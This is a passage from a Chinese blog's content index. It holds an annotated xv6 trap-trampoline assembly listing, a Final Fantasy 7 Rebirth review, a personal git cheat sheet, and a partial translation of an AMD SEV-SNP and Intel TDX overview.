&quot;memlayout.h&quot;.section trampsec.globl trampoline.globl usertraptrampoline:.align 4.globl uservecuservec:            # 从用户态触发陷入跳转到此处，        # 此时特权级为 S 模式（内核态），页表仍为用户页表        # 将 a0 进行暂存        csrw sscratch, a0        li a0, TRAPFRAME                # 将用户寄存器保存到 trapframe 中        sd ra, 40(a0)        sd sp, 48(a0)        sd gp, 56(a0)        sd tp, 64(a0)        sd t0, 72(a0)        sd t1, 80(a0)        sd t2, 88(a0)        sd s0, 96(a0)        sd s1, 104(a0)        # 没有保存 a0，因为用来暂存了 TRAPFRAME        sd a1, 120(a0)        sd a2, 128(a0)        sd a3, 136(a0)        sd a4, 144(a0)        sd a5, 152(a0)        sd a6, 160(a0)        sd a7, 168(a0)        sd s2, 176(a0)        sd s3, 184(a0)        sd s4, 192(a0)        sd s5, 200(a0)        sd s6, 208(a0)        sd s7, 216(a0)        sd s8, 224(a0)        sd s9, 232(a0)        sd s10, 240(a0)        sd s11, 248(a0)        sd t3, 256(a0)        sd t4, 264(a0)        sd t5, 272(a0)        sd t6, 280(a0)\t    # 将 a0 进行保存        csrr t0, sscratch        sd t0, 112(a0)        # 从 trapframe 中恢复内核栈指针        ld sp, 8(a0)        # 从 trapframe 中恢复 tp        ld tp, 32(a0)        # 从 trapframe 中加载内核 usertrap() 地址        ld t0, 16(a0)        # 从 trapframe 中加载内核页表基址        ld t1, 0(a0)        # 充当内存屏障作用？（不确定）        sfence.vma zero, zero        # 切换到内核页表        csrw satp, t1        # 刷新 TLB        sfence.vma zero, zero        # 无条件跳转到 usertrap() 中        # 不像 call，jmp 不会自动返回        jr t0\n跳转到内核 trap.c 的处理函数 usertrap、usertrapret 并处理完成后，将会调用下列函数 userret：\n.globl userretuserret:        # userret(pagetable)        # a0: user page table, for satp.        # 切换回用户页表        sfence.vma zero, zero        csrw satp, a0        sfence.vma zero, zero        li a0, TRAPFRAME        # 从 trapframe 中恢复除 a0 外的所有寄存器        ld ra, 40(a0)        ld sp, 48(a0)        ld gp, 56(a0)        ld tp, 64(a0)        ld t0, 72(a0)        ld t1, 80(a0)        ld t2, 88(a0)        ld s0, 96(a0)        ld s1, 104(a0)        ld a1, 120(a0)        ld a2, 128(a0)        ld a3, 136(a0)        ld a4, 144(a0)        ld a5, 152(a0)        ld a6, 160(a0)        ld a7, 168(a0)        ld s2, 176(a0)        ld s3, 184(a0)        ld s4, 192(a0)        ld s5, 200(a0)        ld s6, 208(a0)        ld s7, 216(a0)        ld s8, 224(a0)        ld s9, 232(a0)        ld s10, 240(a0)        ld s11, 248(a0)        ld t3, 256(a0)        ld t4, 264(a0)        ld t5, 272(a0)        ld t6, 280(a0)\t    # 恢复 a0 寄存器        ld a0, 112(a0)                # 返回到用户态先前中断的位置，并切回用户态        sret\n","categories":["操作系统"],"tags":["操作系统","xv6"]},{"title":"《最终幻想7：重生》体验分享","url":"/2025/01/18/%E3%80%8A%E6%9C%80%E7%BB%88%E5%B9%BB%E6%83%B37%EF%BC%9A%E9%87%8D%E7%94%9F%E3%80%8B%E4%BD%93%E9%AA%8C%E5%88%86%E4%BA%AB/","content":"《最终幻想7：重生》是我 2024 年最期待的游戏之一。由于发售时还没有 PS5，加上考研复试等事务缠身，没能第一时间体验。后来，后面为了剧情体验的连贯性，我又重温了一遍四年前的《最终幻想7：重制版》，直到最近两个月才正式开坑。\n历经 87 小时通关一周目后，内心感慨万千，不吐不快，于是便有了这篇体验分享。整体而言，《最终幻想7：重生》无愧于我 2024 年的年度游戏，甚至在 jrpg 品类中几乎稳坐我心中的头把交椅。但它并非完美，其中仍有一些让我不太满意或感到遗憾的地方，接下来便一一细说。\n\n提示：本文存在剧透内容。\n\n广阔，未必自由相较于重制版第一作，《重生》最大的进化便是引入了一个可供探索的大地图。但请注意，尽管游戏的地图很大，我却很难称之为“开放世界”。实际上，游戏并未表现出什么构建一个生动、真实的奇幻世界的意图，而是通过一个个清单项来构成世界。而这势必会导致游戏体验上的重复，制作组为了缓解这种枯燥感，尽可能地在这些重复的清单项中引入了差异化设计。例如，同样是捕获陆行鸟，不同地区有不同的解决方式，这些在一定程度上确实减轻了重复感。\n支线任务方面，相比上一作，《重生》有了显著的变化：每个支线任务与队伍中的某个角色相关，完成后可以提升该角色的好感度（与后期金蝶游乐园事件的触发相关），任务的完成情况有两档，完美完成时好感度的提升会更多（推测，未求证）。这其实也表明，《重生》的支线任务和一众美式 RPG 为了描绘世界不同，更专注于塑造队伍中角色的人物性格，强化主角克劳德与队友之间的羁绊。以这样一个视角来审视《重生》的支线任务，个人认为表现的还算不错。\n\n在前期，剧情还未展开时，这样的清单项世界体验还算不错。但到了中后期，主线剧情逐渐变得更吸引人的情况下，游戏却频繁地向玩家抛出新的可探索区域，让游玩体验变得略显疲惫。我印象中这个问题最明显的区域便是星陨峡谷和尼泊尔海姆这一段，一是它们是游戏最后解锁的两个区域，玩家此时已经疲于探索，另外，这部分的主线剧情比较紧凑，很多人可能不愿停下来清理这些清单项。虽说清单项并非一定得做，但是之前没有提到的是，《重生》的清单项世界其实很大程度上是奖励驱动的，探索的收益十分丰厚，尤其是召唤兽的弱化和装备设计图纸，这些与游戏的核心玩法——战斗系统息息相关。因此，就算不为了清单项本身的游玩乐趣，冲着角色 build 强度去也很难不做。\n至于社区中普遍诟病的小游戏和地图设计，我个人反倒体验还好。首先是小游戏，因为个人暂时也不追求白金，所以这部分感觉还算良好，大部分主线或支线中的小游戏若只是想通过基本上尝试一两次也就差不多了，也能起到一定调剂游戏节奏的作用。而像一些比较繁琐且耗时较长的，比如前往太阳海岸途中的女皇之血大赛，游戏也提供了直接跳过的选项（虽然个人并没有跳过）。而关于地图设计，在我看来问题主要源于 SE 的技术力限制，角色与场景间的交互体验相比同类型游戏来说比较糟糕：陆行鸟手感较差，角色攀爬和推箱子等动作十分缓慢且僵硬，还有一些反直觉的空气墙等等…… 而箱庭地图的结构设计本身，个人认为还是可圈可点的，不算优秀，但也在及格线以上的水平。\n指令与动作的交响曲在《最终幻想7：重制版》中，相较于原作，战斗系统迎来了巨大的革新——它以 ATB 指令为核心，同时融入了一定的动作性。我当时便对这套系统十分喜爱，并给予了很高的评价。此次重温，更让我再次体会到其设计的精妙之处，但也确实发现了一些不够成熟的地方。\n首先是对于空中敌人的应对，可以说体验很糟糕。克劳德、蒂法等近战角色无法在空中打出连段，要想比较高效地进行输出，往往只能依赖于魔法，这很大程度上限制了战斗系统的发挥空间。其次，动作与指令的边界感比较模糊。具体来说，游戏中有很多敌人招式非常反直觉，有些招式看似能躲开，其实是指令锁定；而有些招式则更具动作性，基本所见即所得。这种边界的不清晰，让战斗在某些时刻显得不够流畅。\n而要解决上述问题，我认为最好的方法便是明确动作和指令的界限——要么进一步强化动作性，使战斗更加流畅；要么让系统更偏向指令式，突出策略性。而从最终的呈现效果来看，制作组显然选择了前者。《重生》的战斗系统上手的第一感觉便是爽快。近战角色现在引入了空中连段，原本需要装备特定魔石才能解锁的范围普攻，在这一作中成为了默认能力，而克劳德甚至新增了远程普通攻击和快速近身突进。这些改动极大提升了战斗的流畅度，并显著加快了节奏。除此以外，游戏还引入了动作游戏中常见的完美防御机制，不仅让战斗系统的上限进一步提高，也极大改善了原本模糊的指令与动作边界。如今，大部分的敌人攻击都可以依靠闪避或完美防御来化解，战斗手感更加顺畅。值得一提的是，《重生》的完美防御在（被）打击反馈上做的很好，一旦触发，正反馈极强。\n\n联手技算是一个全新的机制，它相当于给战斗系统引入了另外一个维度的资源，给战斗增添了更多的不确定性。在本作的战斗体系下，全员低血量且无 ATB 积攒的情况是十分危险的，玩家要想恢复生命值，就必须向敌人发起攻击以累积 ATB，而在低血量的情况下贸然攻击敌人又很可能导致角色死亡，让战斗局势更加难以挽回，而联手技配合原有的极限技，让玩家在这种情况下多了一份逆风翻盘的可能性。制作组可能是为了尽可能强化这种体验，这一作的战斗明显节奏上更快，而且也更加危险，Normal 难度在同类游戏中绝对算不上低，我数不清有多少次，在全员生命值告急的情况下，坚持一顿连续输出，将 boss 一波带走。这样的战斗体验，可谓十分美妙。\n有关战斗这部分我也没法聊的太多，因为我短短 87 小时的游戏时长，也不太可能把《重生》的战斗玩得很明白。实际上，我玩得算是比较草率，7 个可控角色中，除却强制配队的情况，我基本全程都是克劳德、蒂法和爱丽丝的组合，魔晶石搭配、装备、魔导书等系统也基本只仔细研究了他们三人。但即便如此，综合战斗的乐趣和深度而言，《重生》的这套既复古又现代的战斗系统，也足以在我玩过的 jrpg 中位居第一。\n演出如诗，旋律如泣《重生》的画面表现，是让我比较感到比较失望的点，尤其是在引入了大地图之后，暴露了诸多技术性的问题。\n首先是光影，前作的光影效果给我留下了很深刻的印象，可以说在当时来讲非常出色，尤其是游戏序章炸毁魔晄炉的任务中，光影层次丰富，氛围营造极为出色。要知道，我当时可是在一台性能已经被如今的旗舰手机赶超的 PS4 Slim 上游玩的。但在《重生》中，虽然固定的室内场景还算比较出色，但一旦涉及到室内外切换，光影调整往往迟滞数秒，甚至从室内看向室外，时常出现过曝现象，出口处白茫茫的一片什么也看不见，体验十分糟糕。此外，在非 Pro 版 PS5 上，性能模式（60 FPS）下画面呈现非常模糊，但根据数毛社 Digital Foundry 的评测，该模式下实际的渲染分辨率并不低，大约在 1100p 上下浮动，貌似是没有用上现代的超分辨率技术的缘故，使得画面观感很差。为了更好地体验故事，我后面还是选择全程开着画面模式（30 FPS）来游玩，至少在这个模式下，综合画面质量相比上一作还是有显著进步的。\n虽然画面硬素质很一般，但是场景美术依然可圈可点。尤其是第一张大地图——格拉斯兰地区，场景色调以浅色系为主，营造出极为舒适的视觉观感，这种风格很像另一个我很喜欢的 jrpg ——《最终幻想 15》，其温暖而富有生机的奇幻色彩，正是我心目中理想的日式奇幻世界该有的样子。\n\n要说起《最终幻想》这个 IP 所最不容妥协的，玩家也最不用担心搞砸的是什么，恐怕大部分人都会给出同一个答案，那就是音画表现，更具体来说——演出与音乐。《最终幻想》系列对演出效果的追求是十分偏执的，在如今这个即时演算动画效果已经非常出色，绝大部分游戏厂商都完全放弃了采用预渲染 CG 的情况下，《最终幻想》依然执着地在关键剧情中插入 CG 过场，用以将某些场景的表现力推至极致。这种对演出的极端追求，或许正是《最终幻想》系列的“基因”吧。而本作亦是如此，奉献了很多注定会在系列历史上，乃至整个电子游戏史上留下浓墨重彩一笔的精彩演出。\n《重生》在音乐上交出的答卷也是十分令人满意的，游戏在每张大地图都配备了探索与战斗两套不同编曲的配乐，以便在游玩过程中无缝切换。再结合前面提到的优秀场景美术，使得游戏的清单项清理过程变得不再那么枯燥，至少在前期，体验可以说相当出色。音乐上的“铺张浪费”也是显而易见的，游戏中有很多根本无关紧要的支线任务，甚至是小游戏，都配备了专属 BGM。我脑海中立马能浮现的例子，就有一个青蛙跳台小游戏和一个护送狗的支线任务，当时玩到可谓是大受震撼。\n\n音乐在关键情节的演绎也是极其出色的，《重生》这一部剧情的绝对核心是爱丽丝，因为终章大概率没有多少她的戏份了，因此这一作花了大量的篇幅对她进行塑造，希望给这个角色一个完美的“退场仪式”。这一点从音乐上也能看出来，《重生》这一作编写了大量爱丽丝主题曲的不同变奏版本，分别在各个与之相关的情节播放，比如星陨峡谷的送星仪式，还有古代种神殿中爱丽丝的幼年回忆等，甚至本作的主题曲——《No promises to keep》都是为她量身打造，并奉上了一段极其精彩的演出。这些铺垫在最终章时得到爆发，爱丽丝之死，以及随后紧接的 boss 战，音乐的情绪渲染堪称教科书级别，将玩家的情绪推向极致。\n命运交错，情感升华在开坑《重生》前，我特地花了 30 多小时重温了四年前的重制版一代。在称赞前作优秀战斗系统的同时，也感受到一些叙事上存在的问题，而《重生》这一代甚至将这些问题进一步放大。\n直观感受就是部分情节的呈现显得突兀甚至略显尴尬。个人总结其中一个很大的原因是重制所带来的：97 年原版的《最终幻想 7》虽在当前感动了无数玩家，但在那个 3d 技术尚未成熟的年代，除 CG 过场外，角色的剧情演出基本都是由 q 版小人以较为抽象的方式来表现。如今，制作组试图将这些情节用现代图形技术加持的影视化方式进行重塑，难免会感到很不协调。虽然制作组已经为此优化了很多，但问题依然存在。另外，可能是为了提升游戏体验的丰富度，在我看来 gameplay 在本作中应当占据了较大的话语权，很多不太合理的故事情节实际上是为了引出一些小游戏供玩家体验，而这其中很大一部分其实是原作就有的。\n\n但是尽管如此，《重生》剧情体验的优点也完美继承自上一作，并且同样也得到了提升，那就是人物塑造和细腻的情感刻画。《最终幻想 7》的重制三部曲（虽说最后一部还没出）之所以能做好这部分，其实很大程度上也是因为重制的缘故，当原版可能几个小时的流程被扩展成为一个三四十小时的完整体量游戏时，角色一些可能无关紧要的行为就能有充足的空间被细致刻画。而这些被塑造的十分丰满、富有魅力的角色，也正是我喜欢《最终幻想 7》的原因，同时也是我如此在意它后续故事发展的原因。这一次开坑《重生》的过程，就像是与阔别数年的老朋友重逢，主角团之间产生的一些有趣的互动，为整个冒险旅程注入了独特的温度，很大程度上掩盖了上面提到的一些情节上的瑕疵。仔细想想，这大概也是我热爱 jrpg 的原因吧。\n最后，我想好好聊聊《重生》最后的结局。这个结局带给我的感受是十分复杂的。\n首先，不考虑制作组真正想整的大活，仅从观感来看，情节的演绎方式让我一度感到诧异，甚至是愤怒，这部分最突出的地方莫过于大 boss——萨菲罗斯的各种演出。若要问我《重生》中最讨厌的角色，那非萨菲罗斯莫属了。这个角色在情节中的插入，几乎充斥着整部游戏，虽说这与原版《最终幻想 7》故事精华之一——主角克劳德过去的经历密切相关，但在我看来制作组显然没有把控好这个度，让我感到厌烦，尤其在结局处更加放大了这一感受。\n但是另一方面，原版《最终幻想 7》最令人印象深刻的情节——爱丽丝之死使用了一种完全不一样的方式来呈现，这部分的呈现效果非常因人而异。在我的观察下，不同人对剧情的理解不同，可能会得到截然不同的感受。而在我的理解下，至少是我当时得出的结论来说：爱丽丝之死的结果并没有被改变。因此这段情节对我的情感冲击很大，随后的 boss 战更是将整段演出进行升华，杰诺瓦 boss 战的音乐与爱丽丝的主题曲相互交织，带给我近两年从游戏中收获的最大的感动。\n\n\n关于我得出爱丽丝之死没有被改变的结论的原因，一方面是此前采访中制作人滨口直树提到的“一些关键角色的死亡不会被改变，而会以另一种方式来呈现”；另一方面是其实更多的是直觉——或许是我的期待，或许是我的理解。\n\n而在其他一些玩家的体验中，可能得出爱丽丝的结局将被改变，或是还处在对前面引入的平行宇宙设定感到迷惑的阶段，在这一刻下理性思维盖过了感性思维，因此情感并没有被成功调动。因此，结局所带来的冲击力因人而异，或感动，或困惑，或不满。\n至于结局处留下的更多伏笔，网上的讨论有很多，我也对参与其中也并无兴趣，只希望制作组妥善处理，在终章尽可能将这些坑填上，给这场历经数年的冒险旅途画上一个圆满的句号。\n现在的我，已经无比期待终章的发售，不出意外，它应该是我 27 年最期待的游戏了（立个 flag，希望 27 年能出 😭）。\n\n","categories":["游戏"],"tags":["游戏","闲谈"]},{"title":"个人常用git命令整理","url":"/2025/12/23/%E4%B8%AA%E4%BA%BA%E5%B8%B8%E7%94%A8git%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/","content":"由于最近刚刚快速过完了一遍《Pro Git》，因此想要将个人比较常用的 git 命令整理出来，以便需要时翻看。因此本文是一个个人向的笔记，不会涉及对 git 原理的介绍，这部分的具体内容可以参考《Pro Git》。\n\n准备阶段初始化配置# 全局配置文件位置~/.gitconfig# 全局配置用户名git config --global user.name &lt;your_name&gt;# 全局配置邮箱git config --globale user.email &lt;your_email&gt;\n新建仓库# 本地初始化仓库git init &lt;repo_name&gt;# 远程克隆仓库git clone &lt;repo_url&gt;\n工作阶段查看日志# 查看当前分支提交日志git log# 查看 HEAD 指针的变动日志git reflog# 查看当前仓库状态# 包括未跟踪文件、工作区变更、暂存区内容git status\n提交文件# 将工作区更新文件存入暂存区git add &lt;file_path&gt;# 分块交互式提交git add -p &lt;file_path&gt;# 将暂存区更新提交至本地仓库git commit# 将当前暂存区内容追加到 HEAD 指向的提交中git commit --amend\n变更文件# 删除文件# 相当于 rm + git addgit rm &lt;file_path&gt;# 将一个已被跟踪的文件从仓库中移除，变成未跟踪状态git rm --cached &lt;file_path&gt;# 移动/重命名文件git mv &lt;file_path&gt; &lt;new_file_path&gt;\n版本回退# soft: 回退到 git add 后 git commit 前的状态# mixed: 回退到修改后 git add 前的状态# hard: 回退到修改前的状态（危险，清空的工作区不可逆）git reset --&lt;reset_flag&gt; &lt;commit&gt;# 反向应用 commit 的新增内容来实现回退，并创建一条新提交git revert &lt;commit&gt;\n差异比较# 比较当前工作区和 Index 的差异git diff# 已暂存的更改git diff --cached\n分支# 查看分支列表git branch# 创建新分支git branch &lt;branch_name&gt;# 创建并切换到新分支git checkout -b &lt;branch_name&gt;# 切换分支git switch &lt;branch_name&gt;# 合并提交# 在被合并分支和当前分支在一条线上时，指针只会进行移动（fast-forward），无合并提交# 当被合并分支和当前分支存在分叉时，将会产生一次合并提交git merge &lt;branch_name&gt;# 变基（线性合并）提交git rebase &lt;branch_name&gt;# 删除已合并的分支git branch -d &lt;branch_name&gt;# 删除未合并的分支git branch -D &lt;branch_name&gt;# 修改当前分支名git branch -m &lt;new_name&gt;\n远程仓库# 添加远程仓库git remote add &lt;remote_name&gt; &lt;remote_url&gt;# 查看远程仓库信息git remote -v# 将当前仓库推送至远程仓库# 若不指定 remote_branch，则默认 remote_branch = local_branch# （如果 fetch = +refs/heads/*:refs/remotes/origin/* 匹配关系不做修改）git push &lt;remote_name&gt; &lt;local_branch&gt;:&lt;remote_branch&gt;# 将本地仓库的远程分支更新为远程仓库相应分支最新的状态# 不会自动修改本地仓库的状态git fetch &lt;remote_name&gt;# 相当于 git fetch + git mergegit pull &lt;remote_name&gt; &lt;remote_branch&gt;:&lt;local_branch&gt;# 相当于 git fetch + git rebasegit pull --rebase &lt;remote_name&gt; &lt;remote_branch&gt;:&lt;local_branch&gt;\n标签# 为 HEAD 指向的提交创建一个附注标签（允许包含说明）git tag -a &lt;tag_name&gt;# 展示标签信息git show &lt;tag_name&gt;# 为 HEAD 指向的提交创建一个轻量级标签（只是提交的一个别名标记）git tag &lt;tag_name&gt;# 为某个特定 commit 打上标签git tag &lt;tag_name&gt; &lt;commit&gt;# 标签需要显式推送至远程仓库git push origin &lt;tag_name&gt;\n补丁# 打印某个提交并将其重定向为一个 diff 补丁文件git show &lt;commit&gt; &gt; 1.patch # 将补丁应用到工作区中git apply 1.patch# 根据最近 3 次提交创建 git 专用补丁文件# 邮件形式，部分开源项目贡献的方式git format-patch -3# 应用补丁并创建提交git am &lt;file_path&gt;\n常用引用与限定符# 指向下次提交的位置HEAD# 指向 HEAD 前一次提交HEAD^# 指向 HEAD 前 n 次提交HEAD~n# 限定操作对象为指定的文件# 对于 diff, checkout 等均适用-- &lt;file_path&gt;\n实用工作场景提取仓库中的特定提交到当前分支# 将某个提交应用到当前分支git cherry-pick &lt;commit&gt;# 若遇到冲突，编辑冲突的文件，解决冲突后标记/添加进暂存区git add &lt;file_path&gt;# 继续应用过程git cherry-pick --continue\n暂存工作区更改# 将工作区修改（除了未跟踪文件）暂存，并添加文字说明git stash push -m &lt;message&gt;# 恢复最近一次暂存（类似进栈出栈）到工作区git stash pop# 查看暂存列表git stash list# 恢复编号为 n 的暂存内容git stash apply stash@&#123;n&#125;# 删除编号为 n 的暂存内容git stash drop stash@&#123;n&#125;\n提交大文件# 安装 LFSsudo apt install git-lfsgit lfs install# 跟踪大文件类型git lfs track &#x27;*.bin&#x27;# 正常 add 和 commitgit add largefile.bingit commit\n创建无历史记录的全新分支# 切换到一个无任何历史的新分支git checkout --orphan &lt;branch_name&gt;# 将所有暂存区中的文件取消跟踪git rm -rf --cached .# 此时所有文件都处于未跟踪状态# 可以选择性地删除本分支不需要的文件# 并 git add + git commit 创建第一次提交\n调试手段# 打印代码中的每一次最近一次是由哪个提交修改的git blame &lt;file_path&gt;# 当想要找到某个 bug 最早是哪次提交引入的时，可以采用二分搜索# 首先确定一个大致范围，一个有 bug 的提交，一个无 bug 的提交# 确保 HEAD 移动到包含这两次提交的位置（如 master 分支）git checkout master# 重置 bisect 状态git bisect reset# 开始 bisectgit bisect start# 标记两次关键提交git bisect good &lt;good_commit&gt;git bisect bad &lt;bad_commit&gt;# 编译测试，判断是否存在 bug# 有则标记为 bad，无则标记为 goodgit bisect bad/good# 标记后自动跳转到中间提交位置# 重复以上操作，直到收敛到最终的一次关键提交\n参考资料【GeekHour】一小时Git教程_哔哩哔哩_bilibili\n前言 · Pro Git 第二版 简体中文\n","categories":["经验"],"tags":["经验","git"]},{"title":"《General overview of AMD SEV-SNP and Intel TDX》中文翻译","url":"/2025/02/10/%E3%80%8AGeneral%20overview%20of%20AMD%20SEV-SNP%20and%20Intel%20TDX%E3%80%8B%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/","content":"本文为论文《General overview of AMD SEV-SNP and Intel TDX》的中文翻译，翻译工具使用大模型 DeepSeek v3 和通义千问 2.5，经过了本人的核对与校正。由于本人在机密计算领域还处在初学阶段，因此一些专有名词的翻译可能存在问题，欢迎指出。\n\n\nAMD SEV-SNP 和 Intel TDX 的总体概述\n\n\n\n作者：Kevin Kollenda\n\n\n摘要\n\n\n可信执行环境（TEEs）在安全关键代码的执行上应用越来越普遍。AMD SEV-SNP 和 Intel TDX 是新开发的硬件扩展，旨在为虚拟机提供可信执行的环境。通过提供额外的完整性保证并基于之前的安全扩展，它们使得在云环境中实现不会危及敏感用户数据的机密计算成为可能。本文介绍了用于实现这些重大安全增益的额外组件和流程。\n\n关键词\n\n\n可信计算，AMD SEV-SNP，Intel TDX，安全嵌套分页\n介绍如今，软件公司正越来越多地将其应用程序迁移到云环境中，而不是在本地托管。这可能会对机密用户数据构成风险，因为云服务提供商（CSP）可以直接访问运行潜在安全关键应用程序的硬件。可信执行环境（TEEs）提供了一种安全执行代码的方式，而不会将敏感数据泄露给恶意行为者。此前，TEEs 是通过 Intel SGX 实现的。然而，SGX 的工作原理是将应用程序划分为由安全飞地（enclave）保护的可信部分和正常运行的不可信部分。这降低了开发体验，因为开发人员需要了解安全模型并相应地拆分应用程序，而实现一个安全虚拟机（VM）则无需对应用程序代码进行任何调整。\n为了防止信息泄露并保护机密数据，出现了需要关闭虚拟机（VM）访问权限以阻止虚拟机监控程序（hypervisor）访问的需求。AMD 和 Intel 现在基于他们之前的可信计算 CPU 扩展 AMD SEV-ES 和 Intel SGX 进行迭代，以增强虚拟机的完整性保证并最小化可信计算基（TCB）。云服务用户（CSU）能够安全地依赖在云环境中运行的应用程序，充分利用这些新扩展引入的功能。\nAMD 安全嵌套分页（Secure Nested Paging, SNP） 和 Intel 信任域扩展（Trust Domain Extensions, TDX） 是两种基于硬件的 CPU 扩展，旨在提高虚拟机内存数据的机密性和完整性。它们建立在早期扩展（如 Intel SGX 和 AMD SEV-SEM）的基础上，这些早期扩展无法提供足够的完整性保证。这些保证通过允许虚拟机限制对其内存页的写访问以及对安全关键 CPU 指令（如 CPUID）的输出进行加密验证来实现。此外，虚拟机现在可以信任由安全关键组件报告的固件版本与实际运行的版本一致，这对于防止利用已修复问题的回滚攻击（rollback attacks）至关重要。\n与它们的前身扩展 AMD SEV-ES 和 Intel SGX 类似，AMD SEV-SNP 和 Intel TDX 提供了远程认证（remote attestation）能力。生成的认证报告包括虚拟机的状态以及由虚拟机提供的自定义数据（例如用于验证的公钥），这使得云服务用户（CSUs）能够确认其虚拟机已正确启动并执行。\n虽然 AMD SEV-SNP 自 2021 年 3 月以来已适用于所有 AMD EPYC 7003 系列处理器，但 Intel TDX 目前尚未在任何本世代处理器中提供。Linux 内核对 AMD SEV-SNP 和 Intel TDX 的支持于 2022 年 7 月发布的 5.19 版本中引入，并且由于架构相似性，两者共享了一些新添加的代码。\n背景在本节中，将介绍先前的虚拟机扩展及其功能。此外，由于内存完整性的重要性，还将介绍现代计算机系统中内存访问的过程。\n虚拟机 CPU 扩展的历史此前，AMD 和 Intel 开发了多种 CPU 扩展，以支持更可靠且性能更好的虚拟机。其中包括 AMD-V 嵌套分页（Nested Pagint, NP） 和 Intel 扩展页表（Extended Page Table, EPT），它们通过硬件加速的嵌套分页取代了性能较差的基于软件的页虚拟化。\n通过 AMD 安全内存加密（Secure Memory Encryption, SME），为通用计算提供内存加密，以及 AMD 安全加密虚拟化（Secure Encrypted Virtualization, SEV），将 SME 引入由 AMD-V 嵌套分页加速的虚拟机，从而实现了更高的机密性保证。所需的内存加密密钥由集成的低功耗 AMD 安全（协）处理器（AMD SP） 处理，以进一步减少可信组件的数量。目前，Intel 处理器尚未提供硬件辅助的虚拟机内存加密功能，但这将在即将推出的 Intel TDX 扩展中涵盖。虽然 SGX 可以用于虚拟机中以保护虚拟化应用程序（vSGX），但这并不理想，因为一旦为虚拟机启用 SGX，某些虚拟机功能将不可用（例如虚拟机挂起/恢复、快照等）。AMD 还通过引入 AMD SEV-ES（Encrypted State）对其 AMD SEV 扩展进行了迭代，该扩展在虚拟机终止时加密虚拟机的寄存器状态。由于 AMD SEV-ES 已经为虚拟机的寄存器内容提供了完整性保证，因此在 AMD SEV-SNP 中不需要额外的硬件支持来处理虚拟机的状态。\n本世代的处理器会向（恶意的）虚拟机管理器（VMM）提供虚拟机内存的加密内容（通过依赖 SEV），但它们不会阻止对虚拟机内存页的写访问。这使得上述恶意虚拟机监控程序（hypervisor）能够破坏虚拟机的状态，并带来各种重放攻击（replay attacks）的风险。重放攻击是一种攻击向量，恶意行为者在某一时刻获取密文，并在稍后的时间点用这些数据替换未受保护的内存。\nCPU 能力自我报告和安全敏感寄存器现代处理器为运行中的系统提供了多种方式来收集有关当前 CPU 的信息。这主要通过调用 CPUID 指令来实现，该指令报告 CPU 可用的硬件扩展、寄存器大小以及其他一些配置细节。虽然虚拟机监控程序（VMM）通常会模拟和调整该指令的输出，以简化虚拟机迁移并限制虚拟机的功能，但这也可能被恶意虚拟机监控程序滥用。尽管此类干扰在大多数情况下只会导致虚拟机的拒绝服务（denial-of-service），但当报告了错误的扩展保存区域（x86 中包含的）值时，也可能导致缓冲区溢出。特定于处理器模型的寄存器（MSR）是处理器使用的各种控制寄存器，用于提供硬件调试功能、性能监控/跟踪数据以及有关可用 CPU 功能的附加信息。虚拟机监控程序可以不受限制地访问这些寄存器，从而可能对虚拟机的执行进行不必要的干预，例如强制调试断点以中断虚拟机的控制流。同样，硬件扩展所使用的 CPU 微代码补丁级别和 CPU 组件的固件版本也可以从软件中查询。如果信任域（TD）不能依赖安全关键硬件组件运行某个预定的版本，就无法保证上述组件中先前已解决的问题和漏洞不会被利用。\n威胁模型早期 CPU 扩展（例如 AMD SEV 和 AMD SEV-ES）所依赖的威胁模型包含更多需要信任的组件。这是由于缺乏内存完整性保证，使得恶意实体能够篡改虚拟机的内存。由于 SEV-SNP 和 TDX 防止了这种情况，因此以前被认为可信的组件（例如虚拟机监控程序、具有直接内存访问（DMA）能力的 PCI 设备）现在可以安全地假定为不可信。\n分页在典型的 x86_64 系统中，内存是通过页（page）来访问的。分页（paging）用于为每个进程模拟一个完整的虚拟地址空间，而不需要在计算机上实际拥有那么多的内存。它通常还用于页级内存保护，为每个进程提供自己的一组页。因此，用户空间进程无法读取或写入属于其他进程或系统内核的页。分页功能由内存管理单元（MMU）处理，它将应用程序使用的虚拟地址转换为硬件可用的实际物理地址。地址通过将其拆分为不同部分来映射到页。通常，最高有效位对应于页目录项（page directory entry），接下来的位表示页表项（page table entry），剩余的位包含页内的偏移量以及由操作系统设置的各种标志（例如读/写/执行启用）。AMD SEV 允许客户虚拟机使用虚拟机特定的加密密钥选择性地保护和加密内存页，从而限制来自外部源（如虚拟机监控程序）的读取访问。Intel SGX 则采用类似的内存加密方式以单个应用程序为单位来进行加密。\n架构SEV-SNP 和 TDX 利用多种硬件技术为虚拟机提供更安全的可信执行环境（TEE）。下文将描述如何实现这一点以及在此过程中涉及哪些组件。\n安全关键组件SEV-SNP 和 TDX 所实现的架构改进是通过引入新创建的 CPU 集成组件和模块来实现的。其中 AMD 的 SEV-SNP 实现依赖于 CPU 内置的安全处理器来为虚拟机提供安全环境，而 Intel TDX 使用了一种多组件架构，包括以下部分：\n\nIntel TDX 模块提供了一种管理 TD 的安全方法，并强制执行各种安全策略。\nIntel 认证代码模块，用于在受保护内存中加载和验证 TDX 模块。\n使用 Intel SGX 创建的 TD Quoting enclave（TDQE）用于远程证明。\n\n这些组件提供了虚拟机监控程序（hypervisor）创建和配置虚拟机所需的管理接口，并负责拦截针对受 SEV-SNP 或 TDX 保护的虚拟机的任何攻击。与 AMD 的安全处理器（SP）的通信通过一种新的虚拟机管理 API 接口实现，而 Intel 则依赖于额外的 CPU 指令。由于这些组件的数据结构具有安全关键性，外部参与者（例如系统上运行的软件或支持 DMA 的设备）无法访问这些数据结构。这些数据结构包含 CPU 集成安全模块所需的管理信息。例如，SEV-SNP 提供的加密虚拟机保存区域（Virtual Machine Save Area, VMSA），或由使用 TDX 的虚拟机监控程序为每个信任域（TD）发布的虚拟机控制结构（Virtual Machine Control Structure, VMCS）。\n内存完整性保护内存完整性保护是 AMD SEV-SNP 和 Intel TDX 引入的主要改进之一。SEV-SNP 和 TDX 都建立了共享（未加密）和私有（加密）内存页之间的分离。一个页是共享还是私有由虚拟地址的最高有效位指示，并在页表遍历（page table walk）中进行验证。共享页仍然可以使用虚拟机监控程序对应的密钥进行加密，但从虚拟机的角度来看，应将其视为不可信。私有（客户）页始终使用虚拟机特定的密钥进行加密，使得外部观察者无法读取内存内容。\nAMD SEV-SNPAMD SEV-SNP 实现内存完整性改进的核心原则是确保分配了私有内存页的虚拟机始终能够读取它写入这些页的最后一个内存值。SEV-SNP 